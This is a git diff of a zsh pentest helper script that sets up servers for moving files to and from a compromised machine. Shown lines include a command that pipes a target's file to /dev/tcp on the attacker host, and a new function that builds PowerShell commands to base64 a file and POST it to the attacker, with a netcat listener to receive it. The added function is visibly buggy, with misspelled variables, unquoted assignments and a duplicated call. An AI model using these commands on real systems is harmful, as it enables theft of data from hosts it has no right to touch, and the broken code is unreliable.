@@ -17,16 +17,18 @@ nb-srv-file-download    copy command to download a payload into a target machine
 nb-srv-empire-stager    use commands to stealthy download and execute empire stager in a target machine
 nb-srv-web              hosts a python web server in current dir
 nb-srv-uploadserver     hosts a python 'uploadserver' in current dir
-nb-srv-uploadserver-upload  command to upload a file to 'uploadserver' in a windows host
+nb-srv-uploadserver-upload   commands to upload a file to 'uploadserver' using powershell
 nb-srv-ftp              hosts a python ftp server in current dir
-nb-srv-ftp-down         copy command to download the file from ftp server
+nb-srv-ftp-down         command to download the file from ftp server
 nb-srv-smb              hosts an impacket smb server in current dir
-nb-srv-smb-down         copy command to download the file from smb server
+nb-srv-smb-down         commands to download the file from smb server
 nb-srv-tftp             starts the atftpd service in /srv/tftp
 nb-srv-smtp             hosts a python smtp server in current dir
 nb-srv-updog            hosts an updog web server in current dir
 nb-srv-nc-tar           hosts a netcat server > tar file in current dir
 nb-srv-nc-file          hosts a netcat server > file in current dir
+nb-srv-nc-b64           hosts a netcat server > decode b64 file in current dir
+nb-srv-nc-b64-web
 nb-srv-web-hosted       hosts a python web server in /srv, port as $1
 nb-srv-php-hosted       hosts a php web server in /srv, port as $1
 nb-srv-ftp-hosted       hosts a python ftp server in /srv
@@ -268,4 +270,21 @@ nb-srv-nc-b64() {
     __cyan "Use the command below on the target system: "
     echo "openssl base64 -in FILE > /dev/tcp/${__LHOST}/${__LPORT}"
     print -z "nc -nvlp ${__LPORT} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
+}
+
+nb-srv-nc-b64-web() {
+    nb-vars-set-lport
+    nb-vars-set-lport
+    local path && __askvar path "FULL_PATH_TO_FILE"
+
+    echo
+    __COMAND1=$b64 = [System.convert]::ToBase64String((Get-Content -Path '$path' -Encoding Byte))
+    __COMAND2=Invoke-WebRequest -Uri http://${__LHOST}:${__LPORT}/ -Method POST -Body \$b64
+    echo "$__COMMAND2" | wl-copy
+    echo "$__COMMAND1" | wl-copy
+
+    __info "2 Commands copied to clipboard"
+
+    # Run the netcat listener
+    print -z "nc -lvnp ${__LPORT} -w 5 > incoming.b64 && echo '$(cat incoming.b64)' | base64 -d -w 0 > decoded.txt"
 }
